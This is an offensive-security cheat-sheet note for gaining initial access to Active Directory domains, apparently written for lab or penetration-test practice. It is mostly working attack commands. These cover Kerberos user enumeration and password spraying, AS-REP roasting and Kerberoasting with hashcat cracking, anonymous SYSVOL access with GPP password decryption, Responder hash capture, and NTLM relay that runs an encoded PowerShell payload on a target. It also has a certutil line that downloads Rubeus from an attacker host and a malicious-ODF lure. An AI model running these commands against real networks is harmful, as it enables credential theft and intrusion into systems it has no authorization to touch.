---
title: AD Initial Access
type: note
tab: Active Directory
inputs: [Username, Password]
outputs: [Hash, Password, Username]
tags: [ActiveDirectory, Kerberos, SMB, Enumeration, Exploitation]
---

# AD Initial Access

## WHY

Get the first valid domain credential or crackable hash.

## WHEN

- You have a username list.
- Null SMB/RPC leaks shares or users.
- You can safely test common passwords after checking lockout policy.

## NEXT

- Got valid creds: [[Post-Creds Enum]]
- Got hash: [[../Credentials/Hash Crack]]

## Commands

### User Enumeration

#ActiveDirectory #Kerberos #Enumeration
Enumerate valid usernames with Kerbrute before roasting or spraying.

```sh
# User enumeration, no password needed.
kerbrute userenum -d <DOMAIN> --dc <DC_IP> <USERLIST> -o valid_users.txt

# Extract valid usernames into users.txt.
grep -a "VALID USERNAME:" valid_users.txt | awk -F'[@ ]+' '{print tolower($(NF-1))}' | sort -u | grep -vxFf users.txt >> users.txt
```

### ASREPRoast

#Username #Kerberos #ActiveDirectory #Exploitation
Request ASREP hashes for users without pre-auth, then crack them.

```sh
# Option 1: users file.
impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -no-pass -dc-ip <DC_IP> -outputfile asrep.hashes

# Option 2: single known user.
impacket-GetNPUsers <DOMAIN>/<USER> -request -no-pass -dc-ip <DC_IP> -outputfile asrep.hashes

# Crack ASREP hash.
hashcat -m 18200 asrep.hashes <WORDLIST>
```

### Rubeus Kerberoast From Victim Shell

#Shell #Kerberos #Windows #ActiveDirectory #InitialAccess
Request Kerberoastable TGS hashes from a domain-joined victim shell, then crack them offline. This is useful when you have code execution on a domain machine but do not yet have reusable domain credentials.

```powershell
# Target: download Rubeus.
certutil -urlcache -split -f http://<LHOST>/Rubeus.exe Rubeus.exe

# Target: request Kerberoast hashes in hashcat format.
.\Rubeus.exe kerberoast /format:hashcat /nowrap

# Attacker: save the captured TGS hash.
echo '$krb5tgs$MSSQLSvc/DC.access.offsec:670A' > svc_mssql

# Attacker: crack the TGS hash.
hashcat -m 13100 svc_mssql <WORDLIST>
# Example output:
# ....09a4:trustno1
# svc_mssql : trustno1
```

### Kerbrute Password Attacks

#Username #Password #Kerberos #ActiveDirectory #InitialAccess
Use Kerbrute for Kerberos password spray or a single-user brute force after checking lockout risk.

```sh
# Password spray one password across many users.
kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> users.txt '<PASS>'

# Brute force one user with a wordlist.
kerbrute bruteuser -d <DOMAIN> --dc <DC_IP> <WORDLIST> <USER>
```

### Null Session To SYSVOL

#SMB #ActiveDirectory #Enumeration
Check anonymous SMB access, browse SYSVOL if allowed, and decrypt old GPP passwords if found.

```sh
# Check null session shares.
nxc smb <DC_IP> -u '' -p '' --shares

# Access SYSVOL anonymously if allowed.
smbclient //<DC_IP>/SYSVOL -N

# Decrypt old GPP cpassword values found in SYSVOL XML files.
gpp-decrypt <CPASSWORD>
```

### Password Spray

#Username #SMB #ActiveDirectory #Enumeration
Check password policy, then spray one password across a user list.

```sh
# Check password policy first.
nxc smb <DC_IP> -u <USER> -p '<PASS>' --pass-pol

# Spray only after confirming lockout risk.
nxc smb <DC_IP> -u users.txt -p '<PASSWORD>' --continue-on-success
```

### Password Spray Across Protocols

#Username #Password #ActiveDirectory #InitialAccess
Spray one credential across common internal protocols and keep going after the first success.

```sh
for proto in smb winrm ldap mssql ssh rdp; do
  echo "[*] === $proto ==="
  nxc $proto <TARGET_SUBNET> -u <USER> -p '<PASS>' --continue-on-success --no-bruteforce
  echo
done
```

### SMB/RPC User Enum

#RPC #ActiveDirectory #Enumeration
Try anonymous RPC user enum.

```sh
rpcclient -U '' -N <DC_IP> -c 'enumdomusers'
```

### Responder / NTLM Relay

Use this path when you can capture or relay Net-NTLM authentication from a victim.

### Responder Net-NTLMv2 Capture

#NTLM #ActiveDirectory #Exploitation
Capture Net-NTLMv2 with Responder and a coerced UNC path.

```sh
# Kali
sudo responder -I <IFACE> -v
sudo responder -I <IFACE> -wdF
sudo responder -I <IFACE> -wdF -P

# Victim shell or injected input
dir \\<LHOST>\test

# Review captured hashes.
cat /usr/share/responder/logs/*.txt

# Crack captured NTLMv2.
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

### NTLM Relay With SMB Signing Disabled

#NTLM #SMB #ActiveDirectory #Exploitation
Relay captured Net-NTLMv2 when SMB signing is disabled.

```sh
# Check signing on candidate targets.
nxc smb <TARGET_SUBNET>
nxc smb <TARGET_SUBNET> --gen-relay-list targets.txt

# Relay to targets from a file.
impacket-ntlmrelayx -tf targets.txt -smb2support

# Relay to a target and execute a payload.
impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP> -c "powershell -e <BASE64_PAYLOAD>"

# Trigger authentication from a victim.
dir \\<LHOST>\test
```

### Bad-ODF NTLM Capture

#NTLM #ActiveDirectory #Exploitation
Generate a malicious ODF document, upload it to a place the victim opens, capture NetNTLMv2, then crack it.

```sh
# Attacker: generate an ODF payload with Bad-ODF.
# Reference: https://github.com/lof1sec/Bad-ODF

# Attacker: listen for NTLM authentication.
sudo responder -I <IFACE> -v

# After capture, save the NetNTLMv2 hash into hash.txt and crack it.
john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show --format=netntlmv2 hash.txt
```

## Key Notes

- Do not spray until lockout policy is known.
- ASREPRoast needs a username list but not valid creds.
- SYSVOL may contain scripts, XML, passwords, or deployment artifacts.
